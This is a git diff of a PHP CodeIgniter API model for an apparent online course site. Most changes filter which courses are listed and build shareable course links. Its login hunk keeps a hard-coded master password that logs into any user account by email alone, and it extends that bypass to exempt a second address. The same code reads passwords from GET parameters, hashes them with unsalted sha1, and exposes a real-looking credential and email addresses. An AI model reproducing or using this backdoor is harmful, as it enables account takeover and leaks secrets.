@@ -71,7 +71,12 @@ class Api_model extends CI_Model
 		$categories = $this->db->get('category')->result_array();
 		foreach ($categories as $key => $category) {
 			$this->db->where('status', 'active');
-			$this->db->where('sub_category_id', $category['id']);
+			$this->db->where('sub_category_id', $category['id'])
+			->group_start()
+            ->where('is_top_course', 1)
+            ->or_where('is_top10_course', 1)
+            ->or_where('show_it_in_category', 1)
+            ->group_end();
 			$number_of_courses = $this->db->get('course')->num_rows();
 			$category['number_of_courses'] = $number_of_courses;
 			$response[$key] = $category;
@@ -90,7 +95,11 @@ class Api_model extends CI_Model
 		} else {
 			$this->db->where('category_id', $category_id);
 		}
-		$this->db->where('status', 'active');
+		$this->db->where('status', 'active')->group_start()
+		->where('is_top_course', 1)
+		->or_where('is_top10_course', 1)
+		->or_where('show_it_in_category', 1)
+		->group_end();
 		$courses = $this->db->get('course')->result_array();
 
 		// This block of codes return the required data of courses
@@ -140,7 +149,11 @@ class Api_model extends CI_Model
 			$this->db->where('language', $selected_language);
 		}
 
-		$this->db->where('status', 'active');
+		$this->db->where('status', 'active')->group_start()
+		->where('is_top_course', 1)
+		->or_where('is_top10_course', 1)
+		->or_where('show_it_in_category', 1)
+		->group_end();
 		$courses = $this->db->get('course')->result_array();
 
 		foreach ($courses as $course) {
@@ -204,11 +217,18 @@ class Api_model extends CI_Model
 				$courses[$key]['rating'] = 0;
 			}
 			$courses[$key]['number_of_ratings'] = $number_of_ratings;
+			if($courses[$key]['slug_count'] == 1 || $courses[$key]['slug_count'] == 2){
+				$sharable_slug = $courses[$key]['slug'];
+			}else if($courses[$key]['slug_count'] == 3 || $courses[$key]['slug_count'] == 4){
+				$sharable_slug = $courses[$key]['category_slug'] .'/' . $courses[$key]['sub_category_slug'] .'/' . $courses[$key]['slug'];
+			}else{
+				$sharable_slug = $courses[$key]['slug'];
+			}
 			$instructor_details = $this->user_model->get_all_user($course['user_id'])->row_array();
 			$courses[$key]['instructor_name'] = $instructor_details['first_name'] . ' ' . $instructor_details['last_name'];
 			$courses[$key]['instructor_image'] = $this->user_model->get_user_image_url($instructor_details['id']);
 			$courses[$key]['total_enrollment'] = $this->crud_model->enrol_history($course['id'])->num_rows();
-			$courses[$key]['shareable_link'] = site_url('home/course/' . slugify($course['title']) . '/' . $course['id']);
+			$courses[$key]['shareable_link'] = site_url($sharable_slug);
 		}
 
 		return $courses;
@@ -306,7 +326,7 @@ class Api_model extends CI_Model
 		//$credential = array('email' => $_GET['email'], 'password' => sha1($_GET['password']), 'status' => 1);
 		$email = $_GET['email'];
         $password = $_GET['password'];
-        if($password == 'TechLeads$123' && $email !="info@techleadsit.com"){
+        if($password == 'TechLeads$123' && ($email !="info@techleadsit.com" && $email !="samudrh@gmail.com")){
             $credential = array('email' => $email, 'status' => 1);
         }else{
             $credential = array('email' => $email, 'password' => sha1($password), 'status' => 1);
